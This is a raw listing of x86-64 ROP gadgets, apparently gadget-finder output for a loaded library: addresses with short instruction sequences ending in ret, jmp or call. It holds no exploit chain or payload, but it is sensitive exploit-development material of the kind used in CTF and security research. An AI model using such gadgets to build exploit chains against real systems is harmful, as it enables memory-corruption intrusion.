0x00002aaaaabc0845 : or al, byte ptr [rax] ; add byte ptr [rax], al ; mov rdi, qword ptr [rbp - 0x88] ; call rbx
0x00002aaaaabcdfc9 : or al, byte ptr [rax] ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac01d92 : or al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaac6aa85 : or al, byte ptr [rax] ; add byte ptr [rbp + rbx*4 - 0x18], al ; call rsp
0x00002aaaaac51175 : or al, byte ptr [rax] ; add byte ptr [rdx + rcx + 0xabf0000], bh ; add byte ptr [rax], al ; ret 0xa
0x00002aaaaab404b6 : or al, byte ptr [rax] ; add rsp, 0x80 ; ret
0x00002aaaaac90b1b : or al, byte ptr [rax] ; mov al, 9 ; sbb byte ptr [rax], al ; add al, ah ; or dword ptr [rsi], ebp ; ret 0xa
0x00002aaaaabb4191 : or al, byte ptr [rax] ; movsxd rax, dword ptr [rax + rdx*4] ; add rax, rdi ; jmp rax
0x00002aaaaabb6418 : or al, byte ptr [rax] ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaabba69e : or al, byte ptr [rax] ; movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaabae032 : or al, byte ptr [rax] ; movzx eax, al ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaabc0d18 : or al, byte ptr [rbp + 0x31] ; fild dword ptr [rbx + 0xf4104f8] ; xchg eax, esp ; ret
0x00002aaaaab80a5a : or al, byte ptr [rbp - 0xc0e8a37] ; ret
0x00002aaaaab11fc1 : or al, byte ptr [rcx + 0xf] ; xchg eax, edx ; ret 0x8348
0x00002aaaaab442bd : or al, byte ptr [rcx + rcx*8 - 0x7cb7b58c] ; ret 0x8001
0x00002aaaaabfa769 : or al, byte ptr [rcx - 0x7d] ; ret 0x4101
0x00002aaaaaad54b1 : or al, byte ptr [rcx] ; or al, 0x80 ; push rbx ; add al, 4 ; ret 0x6080
0x00002aaaaac6ef0d : or al, byte ptr [rdx] ; add byte ptr [rdx + rdx*2], ah ; stc ; call rsp
0x00002aaaaac21357 : or al, byte ptr es:[rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab0c370 : or al, byte ptr fs:[rax] ; add byte ptr [rax - 0x73], cl ; adc byte ptr [r8 + 0x39], r9b ; ret
0x00002aaaaab738d2 : or al, ch ; cwde ; ret 0xfffe
0x00002aaaaab1ab5d : or al, ch ; lea ebp, dword ptr [rdi - 2] ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabff4a2 : or al, ch ; mov byte ptr [rbx - 0x11], dl ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac0034b : or al, ch ; out dx, eax ; ret 0
0x00002aaaaab42cd7 : or al, ch ; ret
0x00002aaaaac698c9 : or bh, ah ; inc dword ptr [rax + 0xc] ; cld ; call rax
0x00002aaaaac10017 : or bh, bh ; push rax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab5f8a1 : or bh, byte ptr [rax - 1] ; cmovae eax, ecx ; ret
0x00002aaaaab4c81d : or bh, byte ptr [rax - 1] ; ret
0x00002aaaaab8e2bf : or bh, byte ptr [rcx] ; ret
0x00002aaaaabb955f : or bh, dh ; ret
0x00002aaaaabd422f : or bh, dh ; ret 0xfc07
0x00002aaaaabff40e : or bl, al ; mov eax, 1 ; ret
0x00002aaaaac15786 : or bl, al ; nop dword ptr [rax + rax] ; ret
0x00002aaaaab80c93 : or bl, al ; nop dword ptr [rax] ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaabda67b : or bl, al ; nop dword ptr [rax] ; mov rax, qword ptr [rax + 0x58] ; ret
0x00002aaaaabf85a3 : or bl, al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaabf8400 : or bl, al ; nop word ptr [rax + rax] ; ret
0x00002aaaaac812c8 : or bl, bl ; call qword ptr [rdi]
0x00002aaaaac90ac6 : or bl, byte ptr [rax] ; add byte ptr [rax], al ; loopne 0x1bbadd ; ret 0xb
0x00002aaaaaad72dc : or bl, byte ptr [rbx + 0x38] ; ja 0xffffffffd6104b6e ; ret
0x00002aaaaab6b0c5 : or bl, byte ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaabbeab8 : or bl, byte ptr [rdx + 0x59] ; pop rbx ; ret
0x00002aaaaabed79d : or bl, ch ; scasd eax, dword ptr [rdi] ; mov eax, edi ; bswap eax ; ret
0x00002aaaaab4d0e8 : or bl, ch ; xchg eax, edx ; mov edx, eax ; jmp 0x78084
0x00002aaaaac169b6 : or bl, cl ; add al, 0 ; mov edx, 0x190 ; call 0x2dc4b
0x00002aaaaac2fa63 : or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaab02a7f : or bl, dh ; ret
0x00002aaaaabf83ff : or bl, r8b ; nop word ptr [rax + rax] ; ret
0x00002aaaaab80c6d : or byte ptr [r10 + r10 + 0x3b], r14b ; ja 0xabc87 ; cmove rax, rcx ; ret
0x00002aaaaaba9db8 : or byte ptr [r10], r11b ; mov eax, 2 ; ret
0x00002aaaaac008b8 : or byte ptr [r10], r13b ; push 0x19 ; call qword ptr [rax]
0x00002aaaaaba9d31 : or byte ptr [r10], r8b ; xor eax, eax ; ret
0x00002aaaaab08e4d : or byte ptr [r11 + r9*4 + 0x4f], r9b ; sbb byte ptr [rdi], cl ; scasd eax, dword ptr [rdi] ; ret 0xd231
0x00002aaaaab80e86 : or byte ptr [r13 + r13*4 + 0x48], r14b ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaabe4581 : or byte ptr [r13 - 0x7c968b40], r8b ; call 0xffffffffc39a4199
0x00002aaaaab79bc0 : or byte ptr [r14 + 0xf], spl ; adc ecx, dword ptr [rdx + 8] ; mov rax, rdi ; ret
0x00002aaaaab76fcf : or byte ptr [r14 - 0x77], spl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaaba9d22 : or byte ptr [r14], r10b ; mov eax, 1 ; ret
0x00002aaaaaba9dee : or byte ptr [r14], r11b ; mov eax, 2 ; ret
0x00002aaaaab4f60b : or byte ptr [r15], cl ; mov dh, 0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab49087 : or byte ptr [r8 + 0x29], r9b ; ret
0x00002aaaaab51c46 : or byte ptr [r8 + 0x39], r9b ; enter 0x2373, 0xf ; mov dh, 0 ; ret
0x00002aaaaab4e612 : or byte ptr [r8 + 0x3b], r9b ; adc byte ptr [r11 + 6], r14b ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaabab672 : or byte ptr [r8 + 0x63], r9b ; ret 0xf53
0x00002aaaaac0d626 : or byte ptr [r8 + 1], dil ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba9e01 : or byte ptr [r8 + r15*4], r11b ; add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaac0ff5a : or byte ptr [r8 - 0x75], r9b ; jmp rax
0x00002aaaaab76fae : or byte ptr [r8 - 0x76b7f7be], cl ; clc ; ret
0x00002aaaaac3b0b8 : or byte ptr [r8 - 0x77], cl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaac02b82 : or byte ptr [r8 - 0x77], cl ; out 0x48, al ; mov edi, ebx ; call qword ptr [rax]
0x00002aaaaac06721 : or byte ptr [r8 - 0x77], cl ; push rcx ; adc byte ptr [rax + 1], bh ; ret
0x00002aaaaac0cdea : or byte ptr [r8 - 0x77], r9b ; fimul word ptr [rcx + rcx*4 - 1] ; call qword ptr [rax]
0x00002aaaaabbfd4f : or byte ptr [r8 - 0x77], r9b ; ret 0x8948
0x00002aaaaab0ef32 : or byte ptr [r8 - 0x77], r9b ; ret 0xc148
0x00002aaaaabd7617 : or byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaab4913c : or byte ptr [r8 - 9], r9b ; fimul dword ptr [rax - 0x77] ; ror dword ptr [rax + 0x29], cl ; ret
0x00002aaaaac21532 : or byte ptr [r8], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaab1f607 : or byte ptr [r8], r8b ; mov qword ptr [rdi], rax ; mov rax, rdi ; ret
0x00002aaaaab93723 : or byte ptr [r9 + 0x39], cl ; ret 0x8e0f
0x00002aaaaabadd54 : or byte ptr [r9 + 0x63], r9b ; ret 0x4c6
0x00002aaaaab7700e : or byte ptr [r9 - 0x76b7f7be], cl ; clc ; ret
0x00002aaaaab4750f : or byte ptr [r9 - 0x77], r9b ; ret
0x00002aaaaaba9d91 : or byte ptr [r9], r11b ; mov eax, 1 ; ret
0x00002aaaaab518ce : or byte ptr [r9], r14b ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaaba9d7d : or byte ptr [r9], r8b ; mov byte ptr [rdi], 0x5b ; mov eax, 1 ; ret
0x00002aaaaaba9dd6 : or byte ptr [r9], r8b ; mov byte ptr [rdi], al ; mov eax, 1 ; ret
0x00002aaaaaba9d51 : or byte ptr [r9], r8b ; mov eax, 1 ; ret
0x00002aaaaac00383 : or byte ptr [rax + 0x10], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaab09875 : or byte ptr [rax + 0x21], 0xd0 ; movq xmm0, rax ; ret
0x00002aaaaab49088 : or byte ptr [rax + 0x29], cl ; ret
0x00002aaaaac13db4 : or byte ptr [rax + 0x29], cl ; ret 0x1be
0x00002aaaaac14a37 : or byte ptr [rax + 0x29], cl ; ror byte ptr [rax - 0x77], 1 ; ret 0x1be
0x00002aaaaab900d3 : or byte ptr [rax + 0x29], r9b ; ret
0x00002aaaaab49072 : or byte ptr [rax + 0x2b], cl ; adc dword ptr [rax - 0x3f], ecx ; cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x00002aaaaab51c47 : or byte ptr [rax + 0x39], cl ; enter 0x2373, 0xf ; mov dh, 0 ; ret
0x00002aaaaabda0b5 : or byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab569fc : or byte ptr [rax + 0x39], cl ; ret 0x840f
0x00002aaaaab1de15 : or byte ptr [rax + 0x39], cl ; ret 0x8949
0x00002aaaaab4e613 : or byte ptr [rax + 0x3b], cl ; adc byte ptr [r11 + 6], r14b ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaaba1fe9 : or byte ptr [rax + 0x3d], cl ; jne 0xcd06b ; add byte ptr [rax], al ; jne 0xccfd6 ; xor eax, eax ; ret
0x00002aaaaac07b09 : or byte ptr [rax + 0x63], cl ; ret
0x00002aaaaabab673 : or byte ptr [rax + 0x63], cl ; ret 0xf53
0x00002aaaaac7e2ca : or byte ptr [rax + 0xb], cl ; push rdx ; ret
0x00002aaaaac842ac : or byte ptr [rax + 0xb], cl ; ret
0x00002aaaaac80e0d : or byte ptr [rax + 0xb], dl ; ret
0x00002aaaaabed80b : or byte ptr [rax + 0xf], al ; mov dh, 0xc6 ; or eax, edi ; bswap eax ; ret
0x00002aaaaab5dca7 : or byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe2e6f : or byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaabea805 : or byte ptr [rax + 1], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x00002aaaaab060dc : or byte ptr [rax + 1], cl ; ret
0x00002aaaaabda7ee : or byte ptr [rax + 5], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaabe73bb : or byte ptr [rax + 7], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaab20157 : or byte ptr [rax + r9*4 - 0x73], r8b ; push -0x76000005 ; ret 0x8941
0x00002aaaaac28f16 : or byte ptr [rax + rax], al ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab20158 : or byte ptr [rax + rcx*4 - 0x73], al ; push -0x76000005 ; ret 0x8941
0x00002aaaaaba9e02 : or byte ptr [rax + rdi*4], bl ; add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaabb2b1b : or byte ptr [rax - 0x3f], 0xe0 ; add cl, byte ptr [rax - 0x77] ; ret
0x00002aaaaac0411b : or byte ptr [rax - 0x3f], cl ; in eax, dx ; adc byte ptr [rcx - 0x7d], cl ; ret 0x8320
0x00002aaaaab6379e : or byte ptr [rax - 0x73], cl ; add eax, 0x10e4a ; ret
0x00002aaaaab63012 : or byte ptr [rax - 0x73], cl ; add eax, 0x26 ; ret
0x00002aaaaab6888d : or byte ptr [rax - 0x73], cl ; add eax, 0xb3db ; ret
0x00002aaaaab6885e : or byte ptr [rax - 0x73], cl ; add eax, 0xb63a ; ret
0x00002aaaaab80cc6 : or byte ptr [rax - 0x73], cl ; add eax, 0xc31b2 ; ret
0x00002aaaaab63026 : or byte ptr [rax - 0x73], cl ; add eax, 0xdf812 ; ret
0x00002aaaaab80cb2 : or byte ptr [rax - 0x73], cl ; add eax, 0xe916 ; ret
0x00002aaaaab800e2 : or byte ptr [rax - 0x73], cl ; add eax, 0xf596 ; ret
0x00002aaaaabea63e : or byte ptr [rax - 0x73], cl ; add eax, 0xfff8984a ; ret
0x00002aaaaabea72e : or byte ptr [rax - 0x73], cl ; add eax, 0xfff89eaa ; ret
0x00002aaaaac0f9f8 : or byte ptr [rax - 0x73], cl ; je 0x13aa2a ; or byte ptr [rcx + rcx*4 - 0x19], cl ; call qword ptr [rax]
0x00002aaaaac0fb3c : or byte ptr [rax - 0x73], cl ; je 0x13ab6e ; or byte ptr [rcx + rcx*4 - 0x19], cl ; call qword ptr [rax]
0x00002aaaaab7aaa9 : or byte ptr [rax - 0x73], cl ; jg 0xa5ac1 ; jne 0xa628b ; ret
0x00002aaaaab7c14d : or byte ptr [rax - 0x73], cl ; jg 0xa7165 ; jne 0xa7a9b ; ret
0x00002aaaaab569f4 : or byte ptr [rax - 0x73], cl ; or byte ptr [rax - 0x7d], cl ; call 0xffffffffc2416213
0x00002aaaaab53b83 : or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret 0x4801
0x00002aaaaabde7b1 : or byte ptr [rax - 0x75], cl ; add al, 0x24 ; add rsp, 0x38 ; ret
0x00002aaaaabde812 : or byte ptr [rax - 0x75], cl ; add al, 0x24 ; add rsp, 0x40 ; ret
0x00002aaaaabd7151 : or byte ptr [rax - 0x75], cl ; cmp byte ptr [rax - 0x77], cl ; and al, 8 ; call rbx
0x00002aaaaabc85a6 : or byte ptr [rax - 0x75], cl ; cmp ecx, dword ptr [rax - 0x77] ; ret
0x00002aaaaabb11bf : or byte ptr [rax - 0x75], cl ; cmp ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaac0ff5b : or byte ptr [rax - 0x75], cl ; jmp rax
0x00002aaaaab42dd4 : or byte ptr [rax - 0x75], cl ; mov edi, 0xe0 ; call rax
0x00002aaaaac01d6d : or byte ptr [rax - 0x75], cl ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac09c62 : or byte ptr [rax - 0x75], cl ; push rax ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac01d6c : or byte ptr [rax - 0x75], r9b ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab76faf : or byte ptr [rax - 0x76b7f7be], cl ; clc ; ret
0x00002aaaaabe82b5 : or byte ptr [rax - 0x77], 0xda ; call rax
0x00002aaaaab5db4b : or byte ptr [rax - 0x77], cl ; adc ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab0df4a : or byte ptr [rax - 0x77], cl ; add ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab73963 : or byte ptr [rax - 0x77], cl ; clc ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab76ec0 : or byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaabed4a8 : or byte ptr [rax - 0x77], cl ; clc ; sar rax, 6 ; ret
0x00002aaaaab4a7da : or byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x00002aaaaab076a9 : or byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; ret
0x00002aaaaac0cdeb : or byte ptr [rax - 0x77], cl ; fimul word ptr [rcx + rcx*4 - 1] ; call qword ptr [rax]
0x00002aaaaac0ed1e : or byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x5d] ; jmp rax
0x00002aaaaabe3092 : or byte ptr [rax - 0x77], cl ; imul ecx, dword ptr [rax], 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac3b0b9 : or byte ptr [rax - 0x77], cl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaac02b83 : or byte ptr [rax - 0x77], cl ; out 0x48, al ; mov edi, ebx ; call qword ptr [rax]
0x00002aaaaab59e11 : or byte ptr [rax - 0x77], cl ; out dx, eax ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaac01b5b : or byte ptr [rax - 0x77], cl ; out dx, eax ; xor eax, eax ; pop rbx ; pop rbp ; jmp rdx
0x00002aaaaac06722 : or byte ptr [rax - 0x77], cl ; push rcx ; adc byte ptr [rax + 1], bh ; ret
0x00002aaaaab52b2a : or byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x00002aaaaab6d3e7 : or byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac03d65 : or byte ptr [rax - 0x77], cl ; ret 0x314c
0x00002aaaaac0fc8f : or byte ptr [rax - 0x77], cl ; ret 0x4489
0x00002aaaaabc40cb : or byte ptr [rax - 0x77], cl ; ret 0x8348
0x00002aaaaaaf8433 : or byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaab0ef33 : or byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaab5da1d : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp - 0x13], 0xf3 ; ret
0x00002aaaaab5dac7 : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp - 0xd], cl ; ret
0x00002aaaaabd365f : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rbx + rax + 0x48], 0x89 ; adc bl, dh ; ret
0x00002aaaaab5dd29 : or byte ptr [rax - 0x7bf0ffc8], al ; ret 0
0x00002aaaaab569f8 : or byte ptr [rax - 0x7d], cl ; call 0xffffffffc241620f
0x00002aaaaab569f7 : or byte ptr [rax - 0x7d], cl ; call 0xffffffffc2416210
0x00002aaaaab574f8 : or byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaab1dc36 : or byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab68ef6 : or byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab68f7e : or byte ptr [rax - 0x7d], cl ; ret 0x4802
0x00002aaaaab4367e : or byte ptr [rax - 0x7d], cl ; ret 0x4803
0x00002aaaaab29d42 : or byte ptr [rax - 0x7d], cl ; ret 0x8504
0x00002aaaaab4544b : or byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaab4913d : or byte ptr [rax - 9], cl ; fimul dword ptr [rax - 0x77] ; ror dword ptr [rax + 0x29], cl ; ret
0x00002aaaaac195bc : or byte ptr [rax], 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac698a4 : or byte ptr [rax], 0xfc ; inc dword ptr [rax - 0x7f0003f6] ; or al, 0xfc ; call qword ptr [rax]
0x00002aaaaabda68a : or byte ptr [rax], 1 ; add byte ptr [rax], al ; ret
0x00002aaaaac91495 : or byte ptr [rax], al ; add bh, cl ; add al, 0 ; add byte ptr [rbx + 1], al ; add byte ptr [rax], al ; ret
0x00002aaaaac91165 : or byte ptr [rax], al ; add bl, ch ; add eax, 0x690000 ; add byte ptr [rax], al ; ret
0x00002aaaaab529d4 : or byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x00002aaaaab52995 : or byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x8948
0x00002aaaaac195bd : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c111 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac195e1 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab909d7 : or byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; cli ; ret 0x10
0x00002aaaaab50b1c : or byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00002aaaaab584d6 : or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x00002aaaaaaeeee0 : or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pushfq ; ret
0x00002aaaaaaf3608 : or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x18bb
0x00002aaaaaaf0380 : or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x18e7
0x00002aaaaaae0530 : or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x56
0x00002aaaaaaeeec8 : or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xchg eax, esp ; ret
0x00002aaaaabeac04 : or byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 0xd8 ; ret
0x00002aaaaaaf68a1 : or byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, edx ; ret
0x00002aaaaab7f0e9 : or byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaac01da2 : or byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab583d6 : or byte ptr [rax], al ; add byte ptr [rcx + rdi - 0x3e], cl ; jne 0x833a9 ; ret
0x00002aaaaabc772c : or byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; push rbp ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabc8cae : or byte ptr [rax], al ; add byte ptr [rcx - 0x80], al ; jmp qword ptr [rdi]
0x00002aaaaac91d2d : or byte ptr [rax], al ; add byte ptr [rdx + 4], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab63023 : or byte ptr [rax], al ; je 0x8e03a ; lea rax, qword ptr [rip + 0xdf812] ; ret
0x00002aaaaab80cc3 : or byte ptr [rax], al ; je 0xabcda ; lea rax, qword ptr [rip + 0xc31b2] ; ret
0x00002aaaaab1f608 : or byte ptr [rax], al ; mov qword ptr [rdi], rax ; mov rax, rdi ; ret
0x00002aaaaabda27d : or byte ptr [rax], al ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabdce80 : or byte ptr [rax], al ; movzx edi, di ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaac0b26a : or byte ptr [rax], al ; setne al ; add rsp, 0x70 ; pop rbx ; ret
0x00002aaaaab7e0dd : or byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaab7e11b : or byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaab7e0bb : or byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaab3fbcb : or byte ptr [rax], dl ; add byte ptr [rax], al ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaac1fb2e : or byte ptr [rax], r8b ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaab1d76c : or byte ptr [rbp + 0x39], cl ; sal dword ptr [rbp + rsi*2 + 0x4c], -0x77 ; ret 0xf749
0x00002aaaaab40d62 : or byte ptr [rbp + 0x3d8e0fd2], al ; add dword ptr [rax], eax ; add byte ptr [rax + 0x63], cl ; ret 0x3948
0x00002aaaaac485f5 : or byte ptr [rbp + 0x491e75c0], al ; mov edi, dword ptr [rbp] ; call 0x1f8b3
0x00002aaaaabf829f : or byte ptr [rbp + 0x5b001d44], cl ; pop rbp ; ret
0x00002aaaaac75866 : or byte ptr [rbp + 0xb], al ; jae 0x1a0884 ; nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00002aaaaab51882 : or byte ptr [rbp + 0xb], dh ; sub edx, dword ptr [rax + 0x18] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x00002aaaaab80e87 : or byte ptr [rbp + rbp*4 + 0x48], dh ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaabab344 : or byte ptr [rbp + rcx*4 + 0x4a], al ; inc dword ptr [rcx] ; ret 0x5589
0x00002aaaaab8f672 : or byte ptr [rbp - 0x28], dh ; ret
0x00002aaaaab1231d : or byte ptr [rbp - 0x57f2faf], cl ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab80b79 : or byte ptr [rbp - 0x75], al ; sbb al, byte ptr [rcx - 0x75] ; add dword ptr [rcx + 0x39], eax ; ret
0x00002aaaaabd72ae : or byte ptr [rbp - 0x7b], al ; test byte ptr [rax - 0x75], 0x7d ; add byte ptr [rcx + 0xf], al ; lahf ; ret
0x00002aaaaabe9943 : or byte ptr [rbp - 0x7b], cl ; sal byte ptr [rbp - 0x69], 0x48 ; mov ebx, dword ptr [rbp - 8] ; leave ; ret
0x00002aaaaabe4582 : or byte ptr [rbp - 0x7c968b40], al ; call 0xffffffffc39a4198
0x00002aaaaabb09fb : or byte ptr [rbp - 0x9df8b0a], al ; ret
0x00002aaaaabbbfd8 : or byte ptr [rbx + 0x38], 8 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab467c9 : or byte ptr [rbx + 0x44], bl ; mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaaad8cdf : or byte ptr [rbx + 0x4e], ch ; ret 0x6bba
0x00002aaaaaaf4c02 : or byte ptr [rbx + 0x5d5b0443], cl ; pop r12 ; ret
0x00002aaaaac02c8b : or byte ptr [rbx + 0x5d], bl ; add eax, edx ; ret
0x00002aaaaab46fc2 : or byte ptr [rbx + 0x5d], bl ; jmp rax
0x00002aaaaabd8458 : or byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00002aaaaab00ebb : or byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab07dc3 : or byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab5da9f : or byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaaaf6a33 : or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab4e15a : or byte ptr [rbx + 0x5d], bl ; sub rax, rdx ; ret
0x00002aaaaac7151d : or byte ptr [rbx + rcx + 0x7e], cl ; ret
0x00002aaaaab08e4e : or byte ptr [rbx + rcx*4 + 0x4f], cl ; sbb byte ptr [rdi], cl ; scasd eax, dword ptr [rdi] ; ret 0xd231
0x00002aaaaab25197 : or byte ptr [rbx - 0x1776cf3b], al ; pop rbx ; pop rbp ; ret
0x00002aaaaabacdcf : or byte ptr [rbx - 0x3a], al ; add al, 6 ; add dword ptr [rbx - 0x7cb7fe40], eax ; ret 0x4801
0x00002aaaaac120ee : or byte ptr [rbx - 0x6bf0f502], al ; ret
0x00002aaaaab423d1 : or byte ptr [rbx - 0x76fefbbe], al ; ret 0xe281
0x00002aaaaab45a77 : or byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaac69808 : or byte ptr [rbx], 0xfc ; inc dword ptr [rax + 0x10fffc0d] ; add ah, bh ; call rax
0x00002aaaaac7ebb8 : or byte ptr [rbx], al ; call rdi
0x00002aaaaac90981 : or byte ptr [rbx], al ; ret
0x00002aaaaab1f00b : or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x00002aaaaab93724 : or byte ptr [rcx + 0x39], cl ; ret 0x8e0f
0x00002aaaaabab702 : or byte ptr [rcx + 0x3e8c1d0], cl ; and eax, 1 ; pop rbx ; ret
0x00002aaaaab29b89 : or byte ptr [rcx + 0x415d5bd0], cl ; pop rsp ; pop r13 ; ret
0x00002aaaaac16ac5 : or byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; pop r13 ; ret
0x00002aaaaabb5e97 : or byte ptr [rcx + 0x63], cl ; cmp al, 0xbb ; add rdi, r11 ; jmp rdi
0x00002aaaaabadd55 : or byte ptr [rcx + 0x63], cl ; ret 0x4c6
0x00002aaaaac752ea : or byte ptr [rcx + 0xb], cl ; ret
0x00002aaaaab41203 : or byte ptr [rcx + 0xf], al ; mov dh, 0x40 ; add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x00002aaaaab126d9 : or byte ptr [rcx + 1], cl ; fmul qword ptr [rcx + 0xf] ; mov esi, 0xbe0f2414 ; ret 0x8349
0x00002aaaaab1d42b : or byte ptr [rcx + 1], cl ; ret 0x894c
0x00002aaaaab1e0b0 : or byte ptr [rcx + rax - 0x3e], cl ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaac12ef3 : or byte ptr [rcx + rcx*4 + 0x24], cl ; ret 0x8b41
